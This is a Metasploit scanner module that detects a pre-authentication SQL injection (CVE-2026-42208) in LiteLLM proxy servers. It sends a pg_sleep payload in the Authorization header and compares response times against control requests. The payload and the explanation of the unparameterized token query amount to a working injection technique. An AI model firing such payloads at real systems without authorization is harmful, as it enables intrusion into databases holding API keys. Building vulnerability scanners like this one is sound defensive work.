##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BerriAI LiteLLM Proxy Pre-Auth SQL Injection Scanner',
        'Description' => %q{
          This module detects BerriAI LiteLLM proxy servers affected by
          CVE-2026-42208, an unauthenticated SQL injection. During API-key
          verification the proxy interpolates the raw Authorization bearer value
          into a PostgreSQL query (WHERE v.token = '<token>') without
          parameterization. Because LiteLLM only hashes tokens that begin with
          "sk-", a bearer value that does not start with "sk-" reaches the query
          verbatim and is injectable. The failure path that performs the lookup is
          reachable before authentication. Affected versions are 1.81.16 through
          1.83.6 (fixed in 1.83.7).

          The module confirms the flaw with a benign time-based check. It sends a
          baseline request, a bearer carrying a pg_sleep payload, a second baseline
          (which must return quickly), and a bearer carrying a doubled pg_sleep
          payload. It reports the target vulnerable only when the injected delays
          scale with the requested sleep while the controls stay fast, so a server
          that is merely slow is not flagged. It does not read or exfiltrate data.

          Detection requires the target to have provisioned at least one virtual
          key. The injectable predicate sits in a WHERE clause that PostgreSQL
          evaluates only against matching rows, so when the token table is empty
          the pg_sleep never executes and the proxy appears (falsely) safe. Any
          LiteLLM proxy in real use has issued keys; a freshly initialized proxy
          with an empty token table may not respond to the time-based probe.
        },
        'Author' => [
          'Tencent YunDing Security Lab', # vulnerability discovery
          'Kenneth LaCroix' # Metasploit module
        ],
        'References' => [
          ['CVE', '2026-42208'],
          ['GHSA', 'r75f-5x8p-qvmc'],
          ['URL', 'https://bishopfox.com/blog/cve-2026-42208-pre-authentication-sql-injection-in-litellm-proxy']
        ],
        'DisclosureDate' => '2026-04-20',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DefaultOptions' => { 'RPORT' => 4000, 'SSL' => false }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The LiteLLM chat completions endpoint', '/v1/chat/completions']),
        OptInt.new('SLEEP', [true, 'Base pg_sleep delay in seconds for the time-based check', 5]),
        OptString.new('MODEL', [true, 'Model name placed in the request body (need not be a real model)', 'gpt-3.5-turbo'])
      ]
    )
  end

  def effective_sleep
    [datastore['SLEEP'].to_i, 1].max
  end

  # Subquery-wrapped pg_sleep: pg_sleep() returns void, which cannot sit in a
  # bare boolean OR; wrapping it in a subquery keeps the predicate valid.
  def sleep_payload(seconds)
    "' OR (SELECT 1 FROM (SELECT pg_sleep(#{seconds})) t) IS NOT NULL--"
  end

  # Send the chat-completions request with the given bearer value and return
  # [response, elapsed_seconds]. Elapsed is measured with the monotonic clock so
  # it is unaffected by wall-clock adjustments, and includes network RTT (which
  # cancels out in the differential comparison).
  def timed_request(bearer)
    body = {
      'model' => datastore['MODEL'],
      'messages' => [{ 'role' => 'user', 'content' => 'x' }],
      'max_tokens' => 1
    }.to_json
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path),
        'ctype' => 'application/json',
        'headers' => { 'Authorization' => "Bearer #{bearer}" },
        'data' => body
      },
      effective_sleep * 2 + 20
    )
    [res, Process.clock_gettime(Process::CLOCK_MONOTONIC) - started]
  end

  def control_token
    "control-#{Rex::Text.rand_text_alpha(8)}"
  end

  # Best-effort fingerprint via the unauthenticated /health endpoint.
  def fingerprint
    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('health'))
    return nil unless res

    key = res.headers.keys.find { |k| k.casecmp?('x-litellm-version') }
    return "LiteLLM #{res.headers[key]}" if key
    return 'LiteLLM /health' if res.code == 200

    nil
  end

  # Core time-based probe. Returns a result hash.
  def probe
    n = effective_sleep
    n2 = n * 2
    fp = fingerprint

    c1_res, c1 = timed_request(control_token)
    return { error: 'No response to the baseline request', fp: fp } unless c1_res

    _a_res, t_a = timed_request(sleep_payload(n))
    return { vulnerable: false, reason: :no_delay, c1: c1, t_a: t_a, n: n, fp: fp } unless t_a >= c1 + n * 0.6

    # A control taken right after the sleep payload must still be fast. If it is
    # also slow, the target is generally slow/degrading rather than executing our
    # pg_sleep, so we do not flag it.
    c2_res, c2 = timed_request(control_token)
    return { vulnerable: false, reason: :no_baseline, c1: c1, t_a: t_a, n: n, fp: fp } unless c2_res
    return { vulnerable: false, reason: :unstable, c1: c1, c2: c2, t_a: t_a, n: n, fp: fp } unless c2 <= c1 + n * 0.5

    # Doubling the requested sleep must roughly double the added delay.
    _b_res, t_b = timed_request(sleep_payload(n2))
    scaled = (t_b - t_a) >= n * 0.6
    { vulnerable: scaled, reason: (scaled ? :confirmed : :no_scaling), c1: c1, c2: c2, t_a: t_a, t_b: t_b, n: n, n2: n2, fp: fp }
  end

  def check_host(_ip)
    r = probe
    return Exploit::CheckCode::Unknown(r[:error]) if r[:error]
    return Exploit::CheckCode::Safe('No pg_sleep-scaled delay was observed') unless r[:vulnerable]

    Exploit::CheckCode::Vulnerable("Time-based SQLi: pg_sleep(#{r[:n]})=#{r[:t_a].round(2)}s, pg_sleep(#{r[:n2]})=#{r[:t_b].round(2)}s, controls #{r[:c1].round(2)}s/#{r[:c2].round(2)}s")
  end

  def run_host(_ip)
    r = probe
    if r[:error]
      vprint_error("#{peer} - #{r[:error]}")
      return
    end

    vprint_status("#{peer} - Baseline #{r[:c1].round(2)}s#{r[:fp] ? " (#{r[:fp]})" : ''}")

    unless r[:vulnerable]
      case r[:reason]
      when :no_delay
        print_status("#{peer} - Not vulnerable (pg_sleep(#{r[:n]}) returned in #{r[:t_a].round(2)}s vs baseline #{r[:c1].round(2)}s)")
      when :unstable
        print_status("#{peer} - Inconclusive: target is generally slow (post-control #{r[:c2].round(2)}s vs baseline #{r[:c1].round(2)}s); not a clean pg_sleep signal")
      when :no_scaling
        print_status("#{peer} - Inconclusive: delay did not scale with pg_sleep (#{r[:t_a].round(2)}s at #{r[:n]}s, #{r[:t_b].round(2)}s at #{r[:n2]}s)")
      else
        print_status("#{peer} - Not vulnerable")
      end
      return
    end

    print_good("#{peer} - LiteLLM pre-auth SQL injection confirmed (CVE-2026-42208): controls #{r[:c1].round(2)}s/#{r[:c2].round(2)}s, pg_sleep(#{r[:n]})=#{r[:t_a].round(2)}s, pg_sleep(#{r[:n2]})=#{r[:t_b].round(2)}s#{r[:fp] ? "; #{r[:fp]}" : ''}")
    report_vuln(
      host: rhost,
      port: rport,
      name: name,
      info: "Time-based blind SQLi via Authorization header; pg_sleep(#{r[:n]})=#{r[:t_a].round(2)}s vs baseline #{r[:c1].round(2)}s",
      refs: references
    )
  end
end
